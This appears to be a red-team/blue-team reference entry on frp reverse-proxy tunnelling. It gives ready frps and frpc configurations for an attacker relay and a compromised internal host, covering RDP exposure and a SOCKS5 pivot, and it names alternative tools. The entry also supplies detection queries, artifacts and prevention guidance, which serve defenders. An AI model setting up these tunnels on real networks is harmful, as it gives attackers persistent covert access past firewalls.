name: frp - Fast Reverse Proxy Tunneling
description: frp (fast reverse proxy) exposes services behind NAT/firewalls through a public relay. An attacker runs frps on an internet-reachable server and frpc on the compromised internal host; frpc dials out (egress-friendly) and the relay forwards TCP/UDP/HTTP or a SOCKS proxy back into the internal network, enabling pivoting without inbound firewall rules.
notes:
=== SERVER (attacker VPS, public IP) frps.ini ===
  [common]
  bind_port = 7000
  token = <password>
  # run:  frps -c frps.ini

=== CLIENT (compromised internal host) frpc.ini ===
  [common]
  server_addr = <lhost>
  server_port = 7000
  token = <password>

  # expose internal RDP back to the VPS:
  [rdp]
  type = tcp
  local_ip = 127.0.0.1
  local_port = 3389
  remote_port = 13389
  # run:  frpc -c frpc.ini   -> connect to <lhost>:13389

=== SOCKS PROXY INTO THE NETWORK ===
  [socks]
  type = tcp
  remote_port = 11080
  plugin = socks5
  plugin_user = <user>
  plugin_passwd = <password>
  # then: proxychains through <lhost>:11080

=== NEW TOML FORMAT (frp v0.52+) ===
  # frpc.toml with serverAddr/serverPort/auth.token and [[proxies]] blocks

=== ALTERNATIVES ===
  chisel         # single-binary SOCKS over HTTP/WS
  ligolo-ng      # TUN-based, no proxychains needed
  ssh -R / -D    # native reverse + dynamic tunnels

examples.label: Run the client on the victim

recommended.note: chisel is a lighter single-binary SOCKS tunnel.
ligolo-ng for TUN-based pivoting without proxychains.

defense.why_it_works: frpc initiates an OUTBOUND connection to the attacker's relay, so it traverses NAT and egress firewalls that block inbound. The relay then tunnels arbitrary services back in, defeating perimeter segmentation.
defense.prerequisites: Code execution on an internal host with outbound network access and an attacker-controlled public relay.
defense.impact: Persistent reverse access and SOCKS pivoting into segmented internal networks, bypassing inbound firewall controls.
defense.detection: [MITRE T1572] Long-lived outbound connections from a server to an unusual external IP/port (e.g. 7000); frp binary on disk; beaconing/keepalive patterns; proxied internal traffic correlating with the tunnel; TLS/plain traffic to a cheap VPS ASN.
defense.artifacts: Netflow showing sustained egress to a non-business IP, EDR process (frpc/frps), config files (frpc.ini/.toml with server_addr), unusual listening ports on the relay, proxy-chained lateral connections.
defense.splunk_spl:
index=firewall direction=outbound
| stats sum(bytes) as bytes count by src_ip, dest_ip, dest_port, bin(_time,1h)
| where count > 100 AND dest_port!=443 AND dest_port!=80
defense.elastic_kql: process.name:(frpc or frps) or (network.direction:outbound and destination.port:7000)
defense.sentinel_kql:
DeviceProcessEvents
| where FileName in~ ("frpc","frpc.exe","frps","frps.exe")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
defense.prevention: Egress filtering (allowlist destinations/ports, proxy-only outbound); block unknown binaries (app control/WDAC); detect long-lived non-web egress to cheap-VPS ASNs; network segmentation with monitored chokepoints; EDR detection of frp binaries.

detections.name: frp tunneling client/server binary execution
detections.logic:
DeviceProcessEvents
| where FileName in~ ("frpc","frpc.exe","frps","frps.exe") or ProcessCommandLine has "server_addr" or ProcessCommandLine has "frpc.toml"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
detections.false_positives: Legitimate frp use for remote access (rare in enterprises)
detections.tuning: Allowlist sanctioned remote-access tooling; alert on server-origin execution
